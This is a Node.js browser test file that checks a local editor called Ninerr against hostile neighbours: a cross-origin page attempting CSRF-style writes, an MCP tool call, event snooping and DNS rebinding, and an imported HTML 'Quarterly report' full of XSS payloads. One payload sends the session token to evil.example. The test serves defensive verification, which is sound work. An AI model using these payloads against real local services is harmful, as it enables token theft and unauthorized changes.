import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readdirSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { createServer, request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { browserTestOptions } from "./support/browser.mjs";
import { waitRevision } from "./support/editor.mjs";
import { attemptsIn, browse, openTab, startNinerr } from "./support/ninerr-process.mjs";

// P08-G9 (#230, founder section P08.9): the security primitives re-tested together, against
// Ninerr running as a person runs it (scripts/ninerr.mjs, under the no-network trap) with
// its editor open in a real browser. Two hostile neighbours:
// - a web page from another origin, open in the same browser, that tries to read or change
//   projects, drive the MCP endpoint, follow the editor's live changes, replay a used launch
//   link, or reach Ninerr under another host name (DNS rebinding);
// - an HTML file the person imports, written to run script, leak data and reach the network.
// Each attack must fail closed, and nothing may change or leave the computer.

/**
 * The attacker's page: what a page from another origin can make a browser send. Reads and the
 * event stream are blocked by the browser itself (Ninerr sends no CORS headers), so what counts
 * is what Ninerr answered, recorded by the test. The writes include bodiless POSTs, which no
 * media-type check stops: only the Origin check and the token stand between them and an undo.
 */
const attackPage = (ninerr) => `<!doctype html><html><head><title>Totally normal page</title></head><body>
<iframe name="sink" id="sink"></iframe>
<form id="form" method="post" action="${ninerr}/api/projects/create" target="sink" enctype="text/plain"><input name='{"name":"formpwned","x":"' value='"}'></form>
<script>
const ninerr = ${JSON.stringify(ninerr)};
const results = {};
window.results = results;
const settle = (name, promise) => promise.then((value) => { results[name] = value; }, (error) => { results[name] = "refused: " + (error && error.name); });
const blind = (path, init = {}) => fetch(ninerr + path, { method: "POST", mode: "no-cors", ...init }).then(() => "sent");
const attacks = [
  // Reading, which the browser blocks unless Ninerr allows it, and Ninerr refuses first.
  settle("read session", fetch(ninerr + "/api/session").then((response) => response.text())),
  settle("read projects", fetch(ninerr + "/api/projects").then((response) => response.text())),
  settle("read via localhost", fetch(ninerr.replace("127.0.0.1", "localhost") + "/api/session").then((response) => response.text())),
  // Writing blind, with no body: nothing but the Origin check and the token stop these.
  settle("undo", blind("/api/undo")),
  settle("close project", blind("/api/projects/close")),
  settle("checkpoint", blind("/api/checkpoint")),
  // Writing blind, with bodies a browser sends without asking first.
  settle("create project", blind("/api/projects/create", { headers: { "content-type": "text/plain" }, body: JSON.stringify({ name: "pwned" }) })),
  settle("mcp tool", blind("/mcp", { headers: { "content-type": "text/plain" }, body: JSON.stringify({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "create_frame", arguments: { name: "pwned", width: 10, height: 10 } } }) })),
  // Following the editor's live changes.
  settle("events", new Promise((resolve) => {
    const source = new EventSource(ninerr + "/api/events");
    source.onmessage = () => { source.close(); resolve("received an event"); };
    source.onerror = () => { source.close(); resolve("refused"); };
  })),
];
// A form posts across origins without asking, too.
document.getElementById("form").submit();
Promise.all(attacks).then(() => { results.done = true; });
</script></body></html>`;

/** The page the person imports: script, handlers, forms, frames, redirects and remote loads. */
const HOSTILE_IMPORT = `<!doctype html><html><head><title>Quarterly report</title>
<meta http-equiv="refresh" content="0; url=http://evil.example/refresh">
<link rel="stylesheet" href="http://evil.example/style.css">
<link rel="prefetch" href="http://evil.example/prefetch">
<script>window.top.pwnedByScript = true; fetch("http://evil.example/script?" + sessionStorage.getItem("ninerr.token"));</script>
<style>body { background: url("http://evil.example/css-background"); } @import url("http://evil.example/import.css");</style>
</head><body>
<h1 onclick="window.top.pwnedByClick = true">Quarterly report</h1>
<img src="x" onerror="window.top.pwnedByOnerror = true; fetch('http://evil.example/onerror')">
<img src="http://evil.example/pixel.png" alt="pixel">
<svg onload="window.top.pwnedBySvg = true"><a href="javascript:window.top.pwnedByHref = true"><text>link</text></a></svg>
<iframe src="http://evil.example/frame"></iframe>
<object data="http://evil.example/object"></object>
<embed src="http://evil.example/embed">
<form action="http://evil.example/form" method="post"><input name="q" value="1"><button>Send</button></form>
<a href="javascript:window.top.pwnedByLink = true">Click me</a>
<div style="background-image: url(http://evil.example/inline-style)">Revenue grew.</div>
<base href="http://evil.example/">
</body></html>`;

/** A raw request to Ninerr with chosen headers, as a rebinding or foreign page would send it. */
function raw(origin, path, headers, { method = "GET", body } = {}) {
  const { hostname, port } = new URL(origin);
  return new Promise((resolve, reject) => {
    const req = httpRequest({ hostname, port, path, method, headers }, (response) => {
      response.resume();
      response.on("end", () => resolve({ status: response.statusCode, headers: response.headers }));
    });
    req.on("error", reject);
    req.end(body);
  });
}
const status = async (...args) => (await raw(...args)).status;

test("hostile neighbours get nothing from a running Ninerr: a foreign page, a rebinding host name, a used link, a hostile import (P08-G9)", { ...browserTestOptions(), timeout: 240_000 }, async () => {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "ninerr-security-")));
  const projects = join(root, "projects");
  const browser = await browse();
  const attacker = createServer();
  let ninerr = null;
  try {
    ninerr = await startNinerr(projects);
    const editor = await openTab(browser, ninerr.origin, ninerr.first);
    const { page } = editor;
    await page.locator("#new-project-name").fill("work");
    await page.keyboard.press("Enter");
    await waitRevision(page, 0);
    await page.locator("#action-insert-box").click();
    await waitRevision(page, 1);

    // 1. A page from another origin, in the same browser, while the editor is open.
    attacker.on("request", (request, response) => {
      response.writeHead(200, { "content-type": "text/html" }).end(attackPage(ninerr.origin));
    });
    await new Promise((resolve) => attacker.listen(0, "127.0.0.1", resolve));
    const attackerOrigin = `http://127.0.0.1:${attacker.address().port}`;
    const ninerrOrigins = [ninerr.origin, ninerr.origin.replace("127.0.0.1", "localhost")];
    const context = await browser.newContext({ serviceWorkers: "block" });
    const reachedOutside = [];
    await context.route("**/*", (route) => {
      const url = route.request().url();
      if ([attackerOrigin, ...ninerrOrigins].some((origin) => url.startsWith(`${origin}/`))) return route.continue();
      reachedOutside.push(url);
      return route.abort();
    });
    // What Ninerr answered each request the attacker's page made of it.
    const answered = [];
    context.on("response", (response) => {
      const url = new URL(response.url());
      if (ninerrOrigins.includes(url.origin) && response.request().method() !== "GET") answered.push({ method: response.request().method(), path: url.pathname, status: response.status() });
    });
    const evil = await context.newPage();
    // A read or an event stream the browser blocks for CORS has no response for Playwright,
    // though Ninerr answered it: Chromium's own network events still carry that status.
    const network = await context.newCDPSession(evil);
    const sent = new Map();
    network.on("Network.requestWillBeSent", ({ requestId, request }) => sent.set(requestId, request));
    network.on("Network.responseReceivedExtraInfo", ({ requestId, statusCode }) => {
      const request = sent.get(requestId);
      const url = request === undefined ? null : new URL(request.url);
      if (url !== null && ninerrOrigins.includes(url.origin) && request.method === "GET") answered.push({ method: "GET", path: url.pathname, status: statusCode });
    });
    await network.send("Network.enable");
    await evil.goto(`${attackerOrigin}/`);
    await evil.waitForFunction(() => window.results?.done === true, null, { timeout: 30_000 });
    const results = await evil.evaluate(() => window.results);
    for (const name of ["read session", "read projects", "read via localhost"]) assert.match(String(results[name]), /^refused/u, `${name}: ${results[name]}`);
    assert.equal(results.events, "refused");
    // The form's post is a navigation of the sink frame: wait until Ninerr has answered it.
    for (let tries = 0; tries < 100 && !answered.some((entry) => entry.path === "/api/projects/create" && entry.method === "POST" && answered.filter((other) => other.path === entry.path).length >= 2); tries += 1) await new Promise((resolve) => setTimeout(resolve, 100));
    // Ninerr itself refused every one, at its Origin check: not the browser, not a media type.
    const expected = ["GET /api/session", "GET /api/projects", "POST /api/undo", "POST /api/projects/close", "POST /api/checkpoint", "POST /api/projects/create", "POST /mcp", "GET /api/events"];
    for (const request of expected) assert.ok(answered.some((entry) => `${entry.method} ${entry.path}` === request), `${request} reached Ninerr: ${JSON.stringify(answered)}`);
    assert.equal(answered.filter((entry) => entry.path === "/api/projects/create").length, 2, "both the fetch and the form post reached Ninerr");
    assert.deepEqual(answered.filter((entry) => entry.status !== 403), [], "every request from the foreign page was refused for its origin (403)");

    // 2. A used launch link, from shell history say, opens nothing: Ninerr refuses the ticket.
    const replay = await context.newPage();
    const launch = replay.waitForResponse((response) => new URL(response.url()).pathname === "/api/launch");
    await replay.goto(ninerr.first);
    const launched = await launch;
    // At /api/launch, 401 is the used or expired ticket; a missing origin would be 403.
    assert.equal(launched.status(), 401, "Ninerr refused the used ticket");
    await replay.waitForFunction(() => document.getElementById("dialog-title")?.textContent === "Open Ninerr from its launcher", null, { timeout: 30_000 });
    assert.equal(await replay.evaluate(() => document.documentElement.dataset.ready ?? null), null, "a used link does not open the editor");
    await context.close();

    // 3. Requests made outside a browser's rules: a rebound host name, foreign, null or
    // missing origins, and no token.
    const port = new URL(ninerr.origin).port;
    const at = `127.0.0.1:${port}`;
    assert.equal(await status(ninerr.origin, "/api/session", { host: `evil.example:${port}` }), 421, "a rebound host name is refused");
    assert.equal(await status(ninerr.origin, "/api/session", { host: `evil.localhost:${port}` }), 421, "a name under localhost is not Ninerr's");
    assert.equal(await status(ninerr.origin, "/api/session", { host: `127.0.0.1:${Number(port) + 1}` }), 421, "another port's name is refused");
    assert.equal(await status(ninerr.origin, "/api/session", { host: at, origin: attackerOrigin }), 403, "a foreign origin is refused");
    assert.equal(await status(ninerr.origin, "/api/undo", { host: at, origin: "null" }, { method: "POST" }), 403, "an opaque origin (a sandboxed frame, a data: page) is refused");
    // A missing Origin is how <img>, <script src> or a non-browser client asks: the token decides.
    for (const path of ["/api/session", "/api/projects", "/api/events"]) assert.equal(await status(ninerr.origin, path, { host: at }), 401, `no token, no ${path}`);
    assert.equal(await status(ninerr.origin, "/api/undo", { host: at }, { method: "POST" }), 401, "no token, no undo");
    assert.equal(await status(ninerr.origin, "/mcp", { host: at, "content-type": "application/json" }, { method: "POST", body: "{}" }), 401, "no agent credential, no MCP");
    // The editor's page may not be framed by another site (clickjacking).
    const editorPage = await raw(ninerr.origin, "/", { host: at });
    assert.match(String(editorPage.headers["content-security-policy"]), /frame-ancestors 'none'/u, "the editor cannot be framed");

    // Nothing the attacker sent changed anything: the one project, still at revision 1.
    assert.deepEqual(readdirSync(projects).filter((entry) => !entry.startsWith(".")), ["work"], "no project was created");
    await page.reload();
    await page.waitForFunction(() => document.documentElement.dataset.ready === "true");
    await waitRevision(page, 1);

    // 4. A hostile HTML file, imported by the person.
    writeFileSync(join(root, "report.html"), HOSTILE_IMPORT);
    await page.locator("#action-import").click();
    await page.locator("#import-file").setInputFiles(join(root, "report.html"));
    await page.locator("#dialog[open] button.primary", { hasText: "Review import" }).click();
    await page.locator("#import-review").waitFor();
    await page.locator("#dialog[open] button.primary", { hasText: "Import" }).click();
    await waitRevision(page, 2);
    // Its content is on the canvas, with nothing that runs or loads.
    const frame = await page.evaluate(() => {
      const doc = document.querySelector("iframe").contentDocument;
      return {
        heading: doc.querySelector("h1")?.textContent ?? null,
        active: doc.querySelectorAll("[data-ninerr-root] :is(script, iframe, object, embed, form, meta, link, base, style)").length,
        handlers: [...doc.querySelectorAll("[data-ninerr-root] *")].flatMap((element) => [...element.attributes].map((attribute) => attribute.name)).filter((name) => name.startsWith("on")),
        scriptLinks: [...doc.querySelectorAll("[data-ninerr-root] :is([href], [src], [data])")].map((element) => element.getAttribute("href") ?? element.getAttribute("src") ?? element.getAttribute("data")).filter((value) => /^\s*javascript:|evil\.example/iu.test(value ?? "")),
      };
    });
    assert.equal(frame.heading, "Quarterly report", "the content itself was imported");
    // The second layer, under the import's and the renderer's allowlists: a frame that runs no
    // script and loads nothing, whatever reached it.
    const layers = await page.evaluate(() => {
      const element = document.querySelector("iframe");
      return {
        sandbox: (element.getAttribute("sandbox") ?? "").split(/\s+/u).filter(Boolean).sort(),
        policy: element.contentDocument.querySelector("head meta[http-equiv='Content-Security-Policy']")?.getAttribute("content") ?? null,
      };
    });
    assert.deepEqual(layers.sandbox, ["allow-same-origin"], "the canvas frame is sandboxed without scripts");
    assert.match(layers.policy ?? "", /^default-src 'none';/u, "and its policy loads nothing by default");
    assert.deepEqual({ active: frame.active, handlers: frame.handlers, scriptLinks: frame.scriptLinks }, { active: 0, handlers: [], scriptLinks: [] });
    // Clicking what the page meant to be clicked runs nothing either.
    await page.evaluate(() => {
      const doc = document.querySelector("iframe").contentDocument;
      for (const element of doc.querySelectorAll("h1, a, img, svg")) element.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    const pwned = await page.evaluate(() => Object.keys(window).filter((key) => key.startsWith("pwned")));
    assert.deepEqual(pwned, [], "no script from the import ran");
    assert.equal(await page.title(), "work — Ninerr", "the editor's page was not changed");

    // 5. Through all of it, nothing left the computer: not from the editor, not from Ninerr.
    assert.deepEqual(editor.foreign, [], "the editor's page requested nothing outside Ninerr");
    assert.deepEqual(reachedOutside, [], "the attacker's page reached nothing outside the two origins");
    assert.deepEqual(attemptsIn(ninerr.output.stderr), [], "Ninerr's own code connected to nothing off this computer");
    assert.equal(await ninerr.stop(), 0);
    ninerr = null;
    await editor.page.context().close();
  } finally {
    if (ninerr !== null) await ninerr.kill();
    await browser.close();
    await new Promise((resolve) => attacker.close(resolve));
    rmSync(root, { recursive: true, force: true });
  }
});
